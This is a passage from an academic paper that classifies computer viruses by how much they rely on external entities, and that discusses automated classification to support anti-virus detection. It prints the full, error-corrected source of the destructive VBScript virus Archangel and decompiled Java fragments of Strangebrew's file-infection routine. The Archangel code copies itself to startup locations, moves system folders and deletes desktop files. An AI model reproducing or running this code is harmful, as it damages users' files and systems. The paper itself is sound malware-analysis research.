<p>We consider a typical execution run of the Bash virus, i.e., we neglect any anomalies which might prevent the reproductive process from completing, such as the hard disk crashing or the user terminating an essential process. Let <img src="/img/cache/c3dcb34b290692afb2201938a35c2be9.gif" alt="S=\{s_1,s_2,\dots,s_9\}" valign="middle"/> and <img src="/img/cache/e005a508667fd38a6923b0234070d6ab.gif" alt="A=\{a_1,a_2,\dots,a_8\}" valign="middle"/> where line <img src="/img/cache/865c0c0b4ab0e063e5caa3387c1a8741.gif" alt="i" valign="middle"/> of the virus code (see Fig. 1) corresponds to the transition <img src="/img/cache/2737ebb8679d426300810d2a4088033b.gif" alt="s_i\mapsto^{a_i}s_{i+1}" valign="middle"/>. Therefore each statement in the shell script virus is an action, and the states therefore correspond to the states of the shell which runs the script. The reproductive path is therefore <img src="/img/cache/64a4740206a9033dff9316d9a1a89658.gif" alt="s_1\mapsto^{a_1}s_2\mapsto^{a_2}\dots\mapsto^{a_8}s_9" valign="middle"/>. We consider two entities, the bash virus <img src="/img/cache/b3a88289a29b2c55dcccf5a8dfbfaced.gif" alt="v_B" valign="middle"/> and the bash interpreter <img src="/img/cache/9d5ed678fe57bcca610140957afab571.gif" alt="B" valign="middle"/>, and therefore <img src="/img/cache/59df5376acd96121894d0f64e90c58aa.gif" alt="Ent=\{v_B,B}" valign="middle"/>. The virus is present in every state of its execution, and therefore <img src="/img/cache/7a4481c9047e92b8374068c437ab6800.gif" alt="v_B \varepsilon s" valign="middle"/> for all states <img src="/img/cache/0718ed5a3e27d89dc5efb8160425a476.gif" alt="s \in S" valign="middle"/>. Furthermore, we assume that the Bash interpreter is always present, and therefore <img src="/img/cache/1f583191a9afb0f006eace1be6260807.gif" alt="B \varepsilon s" valign="middle"/> for all <img src="/img/cache/0718ed5a3e27d89dc5efb8160425a476.gif" alt="s \in S" valign="middle"/>. In order to classify the virus, we must consider which entities in <img src="/img/cache/e2089ca428a5d237e5aa730c9308e486.gif" alt="Ent" valign="middle"/> afford the actions in <img src="/img/cache/7fc56270e7a70fa81a5935b72eacbe29.gif" alt="A" valign="middle"/>, and which actions in <img src="/img/cache/7fc56270e7a70fa81a5935b72eacbe29.gif" alt="A" valign="middle"/> make up the sets of self-description actions (<img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/>) and reproductive mechanism actions (<img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/>). As mentioned earlier, the self-description of the virus is stored in environmental variables by statements 1-3, and therefore we say that <img src="/img/cache/176a8656684eb0d2769186de3a7d6d5e.gif" alt="A_{sd}=\{a_1,a_2,a_3\}" valign="middle"/>. The reproductive mechanism is that part of the virus which takes the self-description and produces a copy of the virus. For this virus this corresponds to statements 4-8, and therefore <img src="/img/cache/73ef1d94b58ca5a304d540a60427fb07.gif" alt="A_{rm}=\{a_4,a_5,\dots,a_8\}" valign="middle"/>.</p>
<p>Classification takes place as follows. If we decide that the commands <code>echo</code> and <code>chmod</code> are afforded by the interpreter <img src="/img/cache/9d5ed678fe57bcca610140957afab571.gif" alt="B" valign="middle"/> to the virus <img src="/img/cache/b3a88289a29b2c55dcccf5a8dfbfaced.gif" alt="v_B" valign="middle"/>, then we know that <img src="/img/cache/3d4a1b414aa129717d682331bfa14d23.gif" alt="a_4,a_5,\dots,a_8\in Aff(B,v_B)" valign="middle"/>. Therefore we know that there is an action in <img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/> that is afforded by an external entity (<img src="/img/cache/9d5ed678fe57bcca610140957afab571.gif" alt="B" valign="middle"/>) to the virus (<img src="/img/cache/b3a88289a29b2c55dcccf5a8dfbfaced.gif" alt="v_B" valign="middle"/>), but none of the actions in <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/> are afforded by an external entity, and therefore this virus must be a Type II reproducer. Alternatively, we might consider environmental variable assignments to be afforded by the bash interpreter to the virus. In this case <img src="/img/cache/e9c578f3147af6e5dfa3102a0013c548.gif" alt="a_1,a_2,a_3 \in Aff(B,v_B)" valign="middle"/> and therefore the virus would become a Type IV reproducer, since both there is at least one action in both the self-description and reproductive mechanism actions sets that is afforded by an external entity. We might also consider the case where <img src="/img/cache/9d5ed678fe57bcca610140957afab571.gif" alt="B" valign="middle"/> is no longer considered a separate entity. Under these circumstances, the set of entities consists only of <img src="/img/cache/b3a88289a29b2c55dcccf5a8dfbfaced.gif" alt="v_B" valign="middle"/>, and since there are no other entities <img src="/img/cache/b3a88289a29b2c55dcccf5a8dfbfaced.gif" alt="v_B" valign="middle"/> can be categorised as Type I.</p>
<h3>2.4 Comparing Viruses Under One Ontology</h3>
<p>Above we demonstrated that computer virus classification can be affected by decisions made about the ontology, e.g., redefining the parts of the viruses' behaviour which are afforded by an external entity. Now we shall show that once we have settled on a particular ontology, the classification of different viruses is affected by their differing behaviour.</p>
<p>Let us consider the shell script virus in Fig. 1, modified so that all occurrences of the string <tt>.1</tt> are replaced by <code>$0</code>. Readers familiar with Unix shell scripts will know that <code>$0</code> is interpreted by Bash as "insert the command which executed this shell script here". Typically, the virus above will be executed using the command <tt>"virus.sh"</tt>, and consequently this string will be inserted wherever <code>$0</code> appears.</p>
<p>We shall use the first ontology presented above, which resulted in a Type II classification of the virus <img src="/img/cache/b3a88289a29b2c55dcccf5a8dfbfaced.gif" alt="v_B" valign="middle"/>. In the modified virus <img src="/img/cache/c5b71967ae00e1de1d8a877ba3f174ab.gif" alt="v'_B" valign="middle"/>, every occurrence of <code>$0</code> must be replaced by <tt>virus.sh</tt> by the Bash interpreter, and therefore we know that the first three statements are afforded by the interpreter to the virus, i.e, <img src="/img/cache/4bd674c22342d2a56a3c1fc0b6e4c572.gif" alt="a_1,a_2,a_3\in Aff(B, v'_B)" valign="middle"/>. All other details of the reproductive model remain unchanged. In this modified model there are actions in both <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/> and <img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/> which are afforded by an external agent, and therefore we classify <img src="/img/cache/c5b71967ae00e1de1d8a877ba3f174ab.gif" alt="v'_B" valign="middle"/> as Type IV. Thus, by modifying the virus so that it became more dependent on external entities, but keeping the ontology the same, we have forced a reclassification from Type II to Type IV.</p>
<h3>2.5 Example: Virus.VBS.Archangel</h3>
<p>Archangel (see Fig. 2) is a Visual Basic script virus written for the Microsoft Windows platform. In this section we are concerned only with classifying Archangel with respect to its reproductive behaviour, so we will ignore Archangel's payload actions and concentrate on the means by which Archangel reproduces. In line 5 the virus obtains a handle to the file system with the following statement:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #151B8D; font-weight: bold;">set</span> fso=<span style="color: #E56717; font-weight: bold;">CreateObject</span>(<span style="color: #800000;">&quot;Scripting.FileSystemObject&quot;</span>)<br/>
&nbsp;</div>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">1 &nbsp;MsgBox <span style="color: #800000;">&quot;your computer is in the controle of SATAN!&quot;</span>, 16, <span style="color: #800000;">&quot;Fear&quot;</span><br/>
2 &nbsp;<span style="color: #151B8D; font-weight: bold;">On</span> <span style="color: #151B8D; font-weight: bold;">Error</span> <span style="color: #151B8D; font-weight: bold;">Resume</span> <span style="color: #8D38C9; font-weight: bold;">Next</span><br/>
3 &nbsp;<span style="color: #151B8D; font-weight: bold;">Dim</span> fso, newfolder, newfolderpath<br/>
4 &nbsp;newfolderpath = <span style="color: #800000;">&quot;c:\MyFolder&quot;</span><br/>
5 &nbsp;<span style="color: #151B8D; font-weight: bold;">set</span> fso=<span style="color: #E56717; font-weight: bold;">CreateObject</span>(<span style="color: #800000;">&quot;Scripting.FileSystemObject&quot;</span>)<br/>
6 &nbsp;<span style="color: #8D38C9; font-weight: bold;">If</span> <span style="color: #8D38C9; font-weight: bold;">Not</span> fso.FolderExists(newfolderpath) <span style="color: #8D38C9; font-weight: bold;">Then</span><br/>
7 &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> newfolder = fso.CreateFolder(newfolderpath)<br/>
8 &nbsp;<span style="color: #8D38C9; font-weight: bold;">End</span> <span style="color: #8D38C9; font-weight: bold;">If</span><br/>
9 &nbsp;fso.CopyFile Wscript.ScriptFullName, <span style="color: #800000;">&quot;C:\WINDOWS\SYSTEM\fun.vbs&quot;</span>, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
10 fso.MoveFile <span style="color: #800000;">&quot;C:\WINDOWS\SYSTEM\*.*&quot;</span>,<span style="color: #800000;">&quot;C:\WINDOWS\MyFolder\&quot;</span><br/>
11 fso, newfolder, newfolderpath<br/>
12 newfolderpath = <span style="color: #800000;">&quot;c:\WINDOWS\SYSTEM&quot;</span><br/>
13 <span style="color: #151B8D; font-weight: bold;">set</span> fso=<span style="color: #E56717; font-weight: bold;">CreateObject</span>(<span style="color: #800000;">&quot;Scripting.FileSystemObject&quot;</span>)<br/>
14 <span style="color: #8D38C9; font-weight: bold;">If</span> <span style="color: #8D38C9; font-weight: bold;">Not</span> fso.FolderExists(newfolderpath) <span style="color: #8D38C9; font-weight: bold;">Then</span><br/>
15 <span style="color: #151B8D; font-weight: bold;">Set</span> newfolder = fso.CreateFolder(newfolderpath)<br/>
16 <span style="color: #8D38C9; font-weight: bold;">End</span> <span style="color: #8D38C9; font-weight: bold;">If</span><br/>
17 fso.CopyFile Wscript.ScriptFullName, <span style="color: #800000;">&quot;C:\MyFolder&quot;</span>, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
18 fso.CopyFile Wscript.ScriptFullName, <span style="color: #800000;">&quot;C:\WINDOWS\SYSTEM\fun.vbs&quot;</span>, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
19 fso.MoveFile <span style="color: #800000;">&quot;C:\WINDOWS\SYSTEM32&quot;</span>,<span style="color: #800000;">&quot;C:\WINDOWS\SYSTEM&quot;</span><br/>
20 fso.CopyFile Wscript.ScriptFullName, <span style="color: #800000;">&quot;C:\WINDOWS\SYSTEM\SYSTEM32\fun.vbs&quot;</span>, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
21 fso.CopyFile Wscript.ScriptFullName, <span style="color: #800000;">&quot;C:\WINDOWS\StartMenu\Programs\StartUp\fun.vbs&quot;</span>, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
22 fso.DeleteFile <span style="color: #800000;">&quot;C:\WINDOWS\COMMAND\EBD\AUTOEXEC&quot;</span>,<span style="color: #00C2FF; font-weight: bold;">True</span><br/>
23 fso.DeleteFile <span style="color: #800000;">&quot;C:\WINDOWS\Desktop\*.*&quot;</span><br/>
24 fso.CopyFile Wscript.ScriptFullName, <span style="color: #800000;">&quot;C:\fun.vbs&quot;</span>, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
25 <span style="color: #151B8D; font-weight: bold;">set</span> shell=wscript.<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;wscript.shell&quot;</span>)<br/>
26 <span style="color: #151B8D; font-weight: bold;">set</span> msc=shell.CreateShortCut(<span style="color: #800000;">&quot;C:\WINDOWS\COMMAND\EBD\AUTOEXEC.bat&quot;</span>)<br/>
27 msc.TargetPath=shell.ExpandEnvironment(<span style="color: #800000;">&quot;C:\fun.vbs&quot;</span>)<br/>
28 msc.WindowStyle=4<br/>
29 msc.Save<br/>
30 <span style="color: #151B8D; font-weight: bold;">set</span> batch=fso.CreateTextFile(<span style="color: #800000;">&quot;C:\AUTOEXEC.bat&quot;</span>)<br/>
31 batch.WriteLine <span style="color: #800000;">&quot;@echo off&quot;</span><br/>
32 batch.WriteLine <span style="color: #800000;">&quot;cls&quot;</span><br/>
33 batch.WriteLine <span style="color: #800000;">&quot;deltree /y C:\WINDOWS\Desktop\*.*&quot;</span><br/>
34 batch.WriteLine <span style="color: #800000;">&quot;start C:\WINDOWS\SYSTEM\fun.vbs&quot;</span><br/>
35 batch.<span style="color: #8D38C9; font-weight: bold;">Close</span><br/>
36 shell.Run <span style="color: #800000;">&quot;C:\AUTOEXEC.bat&quot;</span><br/>
&nbsp;</div>
<p>Figure 2: Virus.VBS.Archangel. Some programming errors have been corrected.</p>
<p>This creates an object of the <code>Scripting.FileSystemObject</code> class called <code>fso</code>. Then, in line 9 Archangel is able to reproduce using the <code>ScriptFullName</code> property of the <code>Wscript</code> object, which contains the filename and path of the currently running instance of the Archangel virus. The <code>CopyFile</code> method of the <code>fso</code> object is invoked, and the reproductive process is complete:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">fso.CopyFile Wscript.ScriptFullName, &lt;dest&gt;, <span style="color: #00C2FF; font-weight: bold;">True</span><br/>
&nbsp;</div>
<p>This reproductive process occurs six times during each execution of the virus, with <code>&lt;dest></code> being replaced with a different filename and path each time.</p>
<p>We define the reproductive path in terms of the following labelled transition system (<img src="/img/cache/a1960cf9d42df17fc7d96ba38fa4452f.gif" alt="S,A" valign="middle"/> and <img src="/img/cache/64694d71640004d29f8cb99a483a288a.gif" alt="\mapsto" valign="middle"/> are therefore defined implicitly):</p>
<div align="center">
<img src="/img/cache/96c65b70477c6d26137fe16c01e6e542.gif" alt="s_1\mapsto^{fs}s_2\mapsto^{cf}s_3" valign="middle"/>
</div>
<p>where <img src="/img/cache/bc7b36fe4d2924e49800d9b3dc4a325c.gif" alt="fs" valign="middle"/> refers to the action in line 5 where the virus obtains a handle to the file system, and <img src="/img/cache/4e29342d9904d64e9e25fd3b92558e2f.gif" alt="cf" valign="middle"/> is the action in line 9 where a copy of the file containing the virus is made.</p>
<p>We assume that calls to external objects are afforded by the Windows operating system, which we give as an entity <img src="/img/cache/17bc10091293fdc562a6db69940ee924.gif" alt="OS" valign="middle"/>. Therefore <img src="/img/cache/c8f00a84371776d7241e3ba81ffe7b8e.gif" alt="Ent=\{v_A,OS\}" valign="middle"/> where <img src="/img/cache/348c65128c930fe2773b3112c37f1b53.gif" alt="v_A" valign="middle"/> is the Archangel virus and <img src="/img/cache/17bc10091293fdc562a6db69940ee924.gif" alt="OS" valign="middle"/> is the operating system. We assume that both <img src="/img/cache/17bc10091293fdc562a6db69940ee924.gif" alt="OS" valign="middle"/> and <img src="/img/cache/348c65128c930fe2773b3112c37f1b53.gif" alt="v_A" valign="middle"/> are present in all states, and therefore <img src="/img/cache/68629e699490021aed0dac1a69d5da86.gif" alt="e \varepsilon s" valign="middle"/> for all entities <img src="/img/cache/0f5389b62cf8460f6676eaef7e3730a6.gif" alt="e \in Ent" valign="middle"/> and states <img src="/img/cache/0718ed5a3e27d89dc5efb8160425a476.gif" alt="s \in S" valign="middle"/>. The self-description of the virus consists of the use of <code>Wscript.ScriptFullName</code> property, which gives the filename and path of the file containing the virus's self-description. This property occurs in the action <img src="/img/cache/4e29342d9904d64e9e25fd3b92558e2f.gif" alt="cf" valign="middle"/>, and since this property is external to the virus, it must be afforded by the operating system and therefore <img src="/img/cache/fac85a8173928459eb377d31700ee347.gif" alt="cf\in Aff(OS,v_A)" valign="middle"/>. The reproductive mechanism consists of the call to the <code>fso.CopyFile</code> method, and the statement in line 5 which instantiates the fso object. Therefore <img src="/img/cache/88758e7af3e243db7d77dc78bf9123bb.gif" alt="fs,cf\in Aff(OS,v_A)" valign="middle"/>. Since the statement in line 5 contains references to external resources <code>CreateObject</code> and <code>Scripting.FileSystemObject</code>, we know that <img src="/img/cache/88758e7af3e243db7d77dc78bf9123bb.gif" alt="fs,cf\in Aff(OS,v_A)" valign="middle"/>. Now we know that both the self-description and reproductive mechanism abstract actions require the use of external entities, so Archangel is a Type IV computer virus in this model.</p>
<p>In a similar way to the Unix virus above, Archangel can be reclassified as Type I if we no longer consider <img src="/img/cache/17bc10091293fdc562a6db69940ee924.gif" alt="OS" valign="middle"/> to be a separate entity. Then, the only entity left is <img src="/img/cache/348c65128c930fe2773b3112c37f1b53.gif" alt="v_A" valign="middle"/> and therefore it must be Type I.</p>
<h3>2.6 Example: Virus.Java.Strangebrew</h3>
<p>Strangebrew was the first known Java virus, and is able to reproduce by adding its compiled Java bytecode to other Java class files it finds on the host computer. After using a Java decompiler to convert the compiled bytecode to Java, we analysed Strangebrew's reproductive behaviour. Space limitations do not allow us to include the full output of the decompiler (which is over 500 lines); however, we present an overview of Strangebrew's reproductive behaviour for the purposes of classification.</p>
<p>Strangebrew searches for class files in its home directory, which it analyses iteratively until it finds the class file containing the virus. Then, it opens this file for reading using an instance of the Java RandomAccessFile class.</p>
<div class="java" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">int</span> k <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> as <span style="color: #339933;">!=</span> <span style="color: #000066; font-weight: bold;">null</span> <span style="color: #339933;">&amp;&amp;</span> k <span style="color: #339933;">&lt;</span> as.<span style="color: #006633;">length</span><span style="color: #339933;">;</span> k<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; <a style="color: #000060;" href="http://www.google.com/search?hl=en&amp;q=allinurl%3Adocs.oracle.com+javase+docs+api+file"><span style="color: #003399;">File</span></a> file1 <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> <a style="color: #000060;" href="http://www.google.com/search?hl=en&amp;q=allinurl%3Adocs.oracle.com+javase+docs+api+file"><span style="color: #003399;">File</span></a><span style="color: black;">&#40;</span>file, as<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #000000; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #339933;">!</span>file1.<span style="color: #006633;">isFile</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">||</span> <span style="color: #339933;">!</span>file1.<span style="color: #006633;">canRead</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">||</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #339933;">!</span>as<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #006633;">endsWith</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">&quot;.class&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">||</span><br/>
&nbsp; &nbsp; &nbsp;file1.<span style="color: #006633;">length</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> 101L <span style="color: #339933;">!=</span> 0L<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">continue</span><span style="color: #339933;">;</span> <span style="color: black; font-style: italic;">// go to next iteration of loop</span><br/>
&nbsp; randomaccessfile <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> <a style="color: #000060;" href="http://www.google.com/search?hl=en&amp;q=allinurl%3Adocs.oracle.com+javase+docs+api+randomaccessfile"><span style="color: #003399;">RandomAccessFile</span></a><span style="color: black;">&#40;</span>file1, <span style="color: #0000ff;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; ...<br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Once this file is opened Strangebrew parses the contents of the file, updating the file access pointer continually until it reaches its own bytecode, which it reads in two sections:</p>
<div class="java" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">byte</span> abyte0<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> <span style="color: #000066; font-weight: bold;">byte</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">2860</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">byte</span> abyte1<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> <span style="color: #000066; font-weight: bold;">byte</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1030</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; ...<br/>
<span style="color: #006633;">randomaccessfile</span>.<span style="color: #006633;">read</span><span style="color: black;">&#40;</span>abyte0<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; ...<br/>
<span style="color: #006633;">randomaccessfile</span>.<span style="color: #006633;">read</span><span style="color: black;">&#40;</span>abyte1<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>In terms of our abstract reproductive model, this section of the virus obtains a self-description, in the form of Java bytecode.</p>
<p>Next the virus closes its host file, and enters a similar second loop, this time searching for any Java class file that is not the host file (i.e., Strangebrew is now looking for potential hosts). When Strangebrew finds a target for infection, it opens the file for reading and writing:</p>
<div class="java" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">randomaccessfile1 <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> <a style="color: #000060;" href="http://www.google.com/search?hl=en&amp;q=allinurl%3Adocs.oracle.com+javase+docs+api+randomaccessfile"><span style="color: #003399;">RandomAccessFile</span></a><span style="color: black;">&#40;</span>file2, <span style="color: #0000ff;">&quot;rw&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Then, Strangebrew parses the bytecode of the potential host, updating the file access pointer until the first insertion point is reached. Strangebrew writes a number of built-in numeric constants to the host file, and in this way at least part of its self-description mechanism is built-in (i.e., afforded by Strangebrew to itself). Finally, Strangebrew finds the insertion points for the bytecode read in previously, and writes this to the host file:</p>
<div class="java" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">randomaccessfile1.<span style="color: #006633;">write</span><span style="color: black;">&#40;</span>abyte0<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; ...<br/>
<span style="color: #006633;">randomaccessfile1</span>.<span style="color: #006633;">write</span><span style="color: black;">&#40;</span>abyte1<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>In terms of our abstract model of reproduction, this section of Strangebrew corresponds to the reproductive mechanism which takes the self-description (Java bytecode) and forms an offspring (infected Java class file).</p>
<p>Classification is as follows. At least part of Strangebrew's self-description is built-in, in the form of the hardcoded numbers that are written to the host executable. However, Strangebrew also uses instances of various Java API classes to read in the rest of its self-description, e.g. File and RandomAccessFile. In particular, the method <code>read()</code> is used to this end. Part of Strangebrew's reproductive mechanism is built-in also, in terms of the statements that result in the correct insertion points being found, for example. However, Strangebrew also uses the File and RandomAccessFile Java API classes for its reproductive mechanism, in particular the <code>write()</code> method.</p>
<p>We can model the reproduction of Strangebrew as follows. We define a set of states <img src="/img/cache/dc510eb7fd0d66425a6f9052abad70a0.gif" alt="S=\{s_1,s_2,\dots,s_7\}" valign="middle"/>, and a set of entities <img src="/img/cache/5dc116edd57a612024f58aaf6dc5ce5d.gif" alt="Ent=\{v_S,API\}" valign="middle"/>, where <img src="/img/cache/29fdafb9742bde3e49fbb1f6a287120f.gif" alt="v_S" valign="middle"/> is the Strangebrew virus and <img src="/img/cache/db974238714ca8de634a7ce1d083a14f.gif" alt="API" valign="middle"/> is the Java API. Let the following abstract actions represent the behaviours of the Strangebrew virus:</p>
<ul>
<li>search-for-host-file = <img src="/img/cache/027c3429f98f7c39bab027549e1b9c7b.gif" alt="a_1" valign="middle"/></li>
<li>find-self-description = <img src="/img/cache/30c872662b356aa720d1971361b45724.gif" alt="a_2" valign="middle"/></li>
<li>read-in-self-description = <img src="/img/cache/48b0c0899579ff296e9e96c6ef9e4c4d.gif" alt="a_3" valign="middle"/></li>
<li>search-for-host-file = <img src="/img/cache/ce58a68c8a49c1f3f13ce92cdcfe2d73.gif" alt="a_4" valign="middle"/></li>
<li>find-insertion-point = <img src="/img/cache/089ff39a17b4ec2d40f4f00851804b5b.gif" alt="a_5" valign="middle"/></li>
<li>write-self-description = <img src="/img/cache/e24691522eafc06f9fd71a694401d16f.gif" alt="a_6" valign="middle"/></li>
</ul>
<p>Therefore the set of actions <img src="/img/cache/78526d5638d681c7660f8e9aaba44e70.gif" alt="A=\{a_1,a_2,\dots,a_6\}" valign="middle"/>.</p>
<p>Then, the path of reproduction is as follows:</p>
<div align="center">
<img src="/img/cache/e2c54ca1cb1d8885180975f110c31bd4.gif" alt="s_1\mapsto^{a_1} s_2\mapsto^{a_2}s_3\mapsto^{a_3}s_4\mapsto^{a_4}s_5\mapsto^{a_5}s_6\mapsto^{a_6}s_7" valign="middle"/>
</div>
<p>By analysis of the virus given above we know that all of these actions use the Java API to function, and therefore <img src="/img/cache/a11991269e06c93650b497f329f7518e.gif" alt="a_1,a_2,\dots a_6 \in Aff(API,v_S)" valign="middle"/>. Since the actions <img src="/img/cache/027c3429f98f7c39bab027549e1b9c7b.gif" alt="a_1" valign="middle"/> to <img src="/img/cache/e24691522eafc06f9fd71a694401d16f.gif" alt="a_6" valign="middle"/> describe completely the reproductive behaviour of Strangebrew, we know that both the self-description and reproductive mechanism abstract reproductive actions are afforded by external entities, and therefore Strangebrew is a Type IV computer virus.</p>
<p>Again, we can reclassify Strangebrew as Type I if we remove the entity <img src="/img/cache/db974238714ca8de634a7ce1d083a14f.gif" alt="API" valign="middle"/> from the reproduction model.</p>
<h2>3 Automated Classification for Detection</h2>
<p>In the simple examples above we have seen the flexibility of classification within our ontology. It is possible to make various classifications of the same virus by modifying the reproduction model that results in the classification. In this section, we will show how this flexibility lets us tailor the classification towards the capabilities of particular anti-virus software, and in doing so classify viruses according to difficulty of detection by behaviour monitoring.</p>
<p>It has been shown that it is possible to classify computer viruses using our affordance-based ontology according to their degree of reliance on external agency. However, the classification methods shown thus far depend on humans to identify which parts of a computer virus correspond to a self-description and reproductive mechanism, and whether these rely on external agency or not. In the case of classification of an assembly language computer virus, for example, such classification would be laborious and slow, and would have to be completed separately for each computer virus or worm.</p>
<p>The question arises: is it possible to automate this process so that classification could be done without so much human toil? It seems that to distinguish the self-description and reproductive mechanism requires human intelligence, since these are qualities we assign to computer viruses (and other reproducers) in such a way that makes sense to us. This part of the classification is therefore ontological; it lets us view and classify computer viruses in a way that distinguishes common features and arranges like with like. It is, perhaps, not surprising that such a process is not easily automatable. However, the second part of the classification process - determining which parts of the virus rely on external agents - shows greater promise for automation. One can imagine a situation where an assembly code virus can be analysed and classified according to whether it requires the aid of external agency or not, once we have defined what those external agents are. For instance, if we choose the operating system to be an external agent, then any assembly language statement which uses a feature of the operating system API must require the aid of an external agent. Therefore we would know that any such virus is not Type I, because Type I reproducers are those that do not require the help of any external entity so defined within the reproduction model.</p>
<p>Therefore, classification as Type I or non-Type I is a relatively straightforward automatable task, but classification into Types II, III and IV is not. In order to classify non-Type I reproducers we must prove reliance on external entities. In order to classify a Type I reproducer we must show the opposite. This could be achieved by static analysis, dynamic analysis or a combination of the two. Static analysis classification would take place in a similar manner to that described above: the source code of a virus could be analysed for any use of an external entity. This could be a process as simple as string-matching for any calls to the operating system API, for example. If any were found then we would know that the virus was not Type I. However, static analysis is limited in the case of computer viruses that employ code obfuscation techniques, e.g., a polymorphic virus may use the operating system API by decoding these statements at run-time, so that they would not appear in the source code of the virus. Therefore, static analysis for automated classification is just as limited other methods that use static analysis, e.g., heuristic analysis. Classification by dynamic analysis would take place empirically. The suspect virus would be executed a number of times, in order to determine whether it makes any calls to an external agency. Of course, this assumes that we are able to intercept such calls, but as we shall see this might actually be a help rather than a hindrance. The advantage of dynamic over static analysis is that polymorphic viruses would not be able to employ code obfuscation to hide their reliance on external agency. However, the obvious disadvantage is that the virus may conceal its behaviour in other ways, such as only reproducing at certain times so that we may observe the virus to be unreliant upon external agency only because it has not reproduced. Therefore we would need to be sure that the virus has reproduced, which depending on the virus, can be a difficult problem in itself. Overall, classification by automated means is possible but limited, as are most other forms of classification for virus detection.</p>
<p>As we have discussed, classification into Type I versus non-Type I is potentially automatable. However, it may be even more useful to sub-categorise those viruses outside Type I according to their amount of reliance on external agency. This metric would rely on whether we have used static or dynamic analysis (or both) for classification. For example, one such metric would be to simply count the number of times a virus accesses an external resource, either by static analysis (counting the occurrence of such statements) or by dynamic analysis (monitoring behaviour over a period of time and performing statistical analysis to find the mean, for example). It would also be possible to tailor metrics for various purposes, e.g., additional weighting to instructions that control network data operations might identify the most network-intensive worms, for example. More information, including an example of such a metric, is given in Section 3.4.</p>
<h3>3.1 Anti-Virus Software Ontologies</h3>
<p>We have seen how computer viruses can be classified differently according to how we define the virus's ecology, e.g., defining the operating system as an external agent might take a virus from Type I to Type II. We can take advantage of this flexibility of classification to tailor the classification procedure towards assisting anti-virus software. The increasing risk of reproducing malware on systems where resources are highly limited, e.g., mobile systems such as phones, PDAs, smartphones, etc., is well documented [20, 24, 31, 19]. However, the limited nature of the resources on these systems is likely to increase the difficulty of effective anti-virus scanning. In any case, it is preferable to the manufacturers, developers and users of all computing systems to use only the most efficient anti-virus software.</p>
